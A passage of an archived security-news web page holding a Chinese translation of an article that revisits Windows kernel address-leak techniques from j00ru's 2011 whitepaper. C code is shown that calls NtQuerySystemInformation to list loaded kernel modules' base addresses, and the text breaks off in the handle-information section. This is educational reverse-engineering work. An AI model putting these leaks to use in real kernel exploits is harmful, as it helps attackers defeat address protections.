<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】通过内核地址保护措施，回顾Windows安全加固技术 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="windows安全,二进制安全"/>
    
        <meta name="description" content="本文为自2011年来针对Windows安全加固技术的回顾，文中讨论的每一种技术，在Github上都可以下载到相应的Visual Studio项目。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】通过内核地址保护措施，回顾Windows安全加固技术</h2>
                <div class="article-msg">
                    <span class="time">2017-03-06 10:05:42</span>
                    
                                        <span class="read">阅读：9506次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3565"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3565" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://samdb.xyz/revisiting-windows-security-hardening-through-kernel-address-protection/"
                             target="_blank">来源： samdb.xyz</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center;"><img src="http://p7.qhimg.com/t0196df22e3a2374d37.jpg" title="t0196df22e3a2374d37.jpg" alt="http://p7.qhimg.com/t0196df22e3a2374d37.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">翻译：shan66</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">预估稿费：200RMB（不服你也来投稿啊！）</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">投稿方式：发送邮件至</span></strong></span><a href="mailto:linwei@360.cn" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; color: rgb(0, 112, 192); font-size: 18px;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">linwei#360.cn</span></strong></span></a><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">，或登陆</span></strong></span><a href="http://bobao.360.cn/contribute/index" target="_blank" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; color: rgb(0, 112, 192); font-size: 18px;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">网页版</span></strong></span></a><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在线投</span></strong></span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在2011年的时候，Windows 7 Service Pack 1如日中天，那时我才开始接触编程，而j00ru则发布了一个介绍在用户模式下通过各种方式访问Windows内核指针的白皮书：Windows Security Hardening Through Kernel Address Protection。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我决定重新回味一下这篇白皮书中讨论的各种技术，搜罗可用于Windows 7上的相应版本，然后调查它们能否在Windows 8 / 8.1 / 10上奏效。遇到无法在Windows 8 / 8.1 / 10上工作的时候，我会进一步研究相应的函数在新版本的Windows中发生了怎样的变化。这方面的工作，虽然很多都被别人做过了，但通过动手实践，我还是学到了很多东西；同时，作为一个有趣的逆向工程的练习，或许对大家也会有所帮助。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">对于每个例子，我都会提供一个可用于Windows 7 32位的实现，然后将其移植到64位Windows，如果发现无法用于新版本的Windows 的话，则说明原来用到的某些特性在新版本操作系统中已经发生了变化。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">本文中讨论的每一种技术，在Github上都可以下载到相应的Visual Studio项目。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows System Information classes</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">NtQuerySystemInformation是一个经典的和众所周知的未公开函数，利用逆向工程的获得的各种细节，人们发现它可以用来收集关Windows内核的状态信息。 它在MSDN上的定义如下：</span></p><pre class="brush:bash;toolbar:false">NTSTATUS&nbsp;WINAPI&nbsp;NtQuerySystemInformation(
&nbsp;&nbsp;_In_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SYSTEM_INFORMATION_CLASS&nbsp;SystemInformationClass,
&nbsp;&nbsp;_Inout_&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SystemInformation,
&nbsp;&nbsp;_In_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SystemInformationLength,
&nbsp;&nbsp;_Out_opt_&nbsp;PULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReturnLength
);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第一个参数是SYSTEM_INFORMATION_CLASS的值，这个值决定返回什么信息。 这些值可以在winternl.h中找到，其他的值也被人通过逆向工程找到了（例如在wine项目实现中就可以找到这些值）。 在j00ru的论文中，他考察了4个枚举值，我们将在后文中单独加以解释。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第二个参数是指向输出数据的结构的指针，它会随着SystemInformationClass值的不同而变化，第三个参数是其长度。 最后一个参数用于返回写入输出结构的数据量。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">为了避免为各个SystemInformationClass值重复编码，我将在这里给出实际定义和调用NtQuerySystemInformation的代码。 首先，我们将包含标准的Visual Studio项目头文件，同时要完整导入Windows.h文件，因为它定义了我们需要用到的许多Windows特有的结构和函数。</span></p><pre class="brush:bash;toolbar:false;">#include&nbsp;&quot;stdafx.h&quot;
#include&nbsp;&lt;windows.h&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们还需要定义NyQuerySystemInformation函数，以便让一个指针指向它，从而便于调用。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;NTSTATUS(WINAPI&nbsp;*PNtQuerySystemInformation)(
&nbsp;&nbsp;&nbsp;&nbsp;__in&nbsp;SYSTEM_INFORMATION_CLASS&nbsp;SystemInformationClass,
&nbsp;&nbsp;&nbsp;&nbsp;__inout&nbsp;PVOID&nbsp;SystemInformation,
&nbsp;&nbsp;&nbsp;&nbsp;__in&nbsp;ULONG&nbsp;SystemInformationLength,
&nbsp;&nbsp;&nbsp;&nbsp;__out_opt&nbsp;PULONG&nbsp;ReturnLength
);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">最后，我们还需要在ntdll中找到NtQuerySystemInformation函数，方法是获取一个ntdll的HANDLE，然后再其中寻找该函数的地址，然后快速检查它是否已成功找到。</span></p><pre class="brush:bash;toolbar:false">HMODULE&nbsp;ntdll&nbsp;=&nbsp;GetModuleHandle(TEXT(&quot;ntdll&quot;));
PNtQuerySystemInformation&nbsp;query&nbsp;=&nbsp;(PNtQuerySystemInformation)GetProcAddress(ntdll,&nbsp;&quot;NtQuerySystemInformation&quot;);
if&nbsp;(query&nbsp;==&nbsp;NULL)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;GetProcAddress()&nbsp;failed.\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">上述代码一旦运行，我们就可以像调用函数一样来查询变量了。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 18px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Windows 7 32 bit &nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">SystemModuleInformation</span></span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这里介绍的第一个SystemInformationClass值是SystemModuleInformation，当使用此值时，返回当前已经加载到内核空间的地址的所有驱动程序的相关数据，包括它们的名称和大小。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">首先，我们需要定义枚举值SYSTEM_INFORMATION_CLASS，稍后我们将其传递给NtQuerySystemInformation，这里其值为11，如下所示。</span></p><p><br/></p><pre class="brush:bash;toolbar:false">typedef&nbsp;enum&nbsp;_SYSTEM_INFORMATION_CLASS&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;SystemModuleInformation&nbsp;=&nbsp;11
}&nbsp;SYSTEM_INFORMATION_CLASS;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来，我们需要定义引用SystemModuleInformation时NtQuerySystemInformation会将信息加载到其中的结构。</span></p><pre class="brush:bash;toolbar:false">#define&nbsp;MAXIMUM_FILENAME_LENGTH&nbsp;255
&nbsp;
typedef&nbsp;struct&nbsp;SYSTEM_MODULE&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reserved1;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reserved2;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ImageBaseAddress;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ImageSize;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Flags;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Id;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rank;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;w018;
&nbsp;&nbsp;&nbsp;&nbsp;WORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NameOffset;
&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE,&nbsp;*PSYSTEM_MODULE;
&nbsp;
typedef&nbsp;struct&nbsp;SYSTEM_MODULE_INFORMATION&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ModulesCount;
&nbsp;&nbsp;&nbsp;&nbsp;SYSTEM_MODULE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modules[1];
}&nbsp;SYSTEM_MODULE_INFORMATION,&nbsp;*PSYSTEM_MODULE_INFORMATION;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如您所见，SYSTEM_MODULE结构包括ImageBaseAddress、ImageSize和Name字段，这些正是我们感兴趣的东西。为了弄清楚我们需要分配多少内存，我们必须调用NtQuerySystemInformation SystemModuleInformation枚举值和一个NULL输出指针，这样的话，它就会加载所需的字节数到ReturnLength参数。</span></p><pre class="brush:bash;toolbar:false">&nbsp;ULONG&nbsp;len&nbsp;=&nbsp;0;
query(SystemModuleInformation,&nbsp;NULL,&nbsp;0,&nbsp;&amp;len);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">现在我们知道了需要多少内存，那么就可以分配一个适当大小的SYSTEM_MODULE_INFORMATION结构了，然后，再次调用NtQuerySystemInformation。</span></p><pre class="brush:bash;toolbar:false">&nbsp;PSYSTEM_MODULE_INFORMATION&nbsp;pModuleInfo&nbsp;=&nbsp;(PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT,&nbsp;len);
if&nbsp;(pModuleInfo&nbsp;==&nbsp;NULL)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Could&nbsp;not&nbsp;allocate&nbsp;memory&nbsp;for&nbsp;module&nbsp;info.\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
}
&nbsp;
query(SystemModuleInformation,&nbsp;pModuleInfo,&nbsp;len,&nbsp;&amp;len);
if&nbsp;(len&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Failed&nbsp;to&nbsp;retrieve&nbsp;system&nbsp;module&nbsp;information.\r\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1;
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在检查一切都返回都没有任何错误后，我们就可以使用ModulesCount字段来遍历SYSTEM_MODULE数组，从而打印每个模块的关键细节信息了。</span></p><pre class="brush:bash;toolbar:false">for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;pModuleInfo-&gt;ModulesCount;&nbsp;i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;kernelImageBase&nbsp;=&nbsp;pModuleInfo-&gt;Modules[i].ImageBaseAddress;
&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;kernelImage&nbsp;=&nbsp;(PCHAR)pModuleInfo-&gt;Modules[i].Name;
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Module&nbsp;name&nbsp;%s\t&quot;,&nbsp;kernelImage);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Base&nbsp;Address&nbsp;0x%X\r\n&quot;,&nbsp;kernelImageBase);
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">构建并运行上述代码，我们将得到以下输出结果。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01e0fd78bbb58a18b8.png" title="t0131060f3b6da7ba3c.png" alt="http://p6.qhimg.com/t0131060f3b6da7ba3c.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个例子的完整代码（包括后面讨论的在64位Windows上运行的版本）可以从Github上面下载。 </span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">SystemHandleInformation</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在j00ru的论文中提到的第二个SystemInformationClass值是SystemHandleInformation，它给出了内核内存中所有进程的每个对象的HANDLE和指针，其中包括所有Token对象。在这里，我们将使用SystemHandleInformation的扩展版本，因为原始版本只给出16位的HANDLE值，这在某些情况下可能是不够的。 首先，我们需要再次定义正确的SYSTEM_INFORMATION_CLASS值。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;enum&nbsp;_SYSTEM_INFORMATION_CLASS&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;SystemExtendedHandleInformation&nbsp;=&nbsp;64
}&nbsp;SYSTEM_INFORMATION_CLASS;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">接下来，我们需要定义输出结构（取自Process Hacker，从第1595行开始）。</span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;struct&nbsp;_SYSTEM_HANDLE
{
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;Object;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;UniqueProcessId;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;HandleValue;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;GrantedAccess;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;CreatorBackTraceIndex;
&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;ObjectTypeIndex;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;HandleAttributes;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Reserved;
}&nbsp;SYSTEM_HANDLE,&nbsp;*PSYSTEM_HANDLE;
&nbsp;
typedef&nbsp;struct&nbsp;_SYSTEM_HANDLE_INFORMATION_EX
{
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;HandleCount;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG_PTR&nbsp;Reserved;
&nbsp;&nbsp;&nbsp;&nbsp;SYSTEM_HANDLE&nbsp;Handles[1];
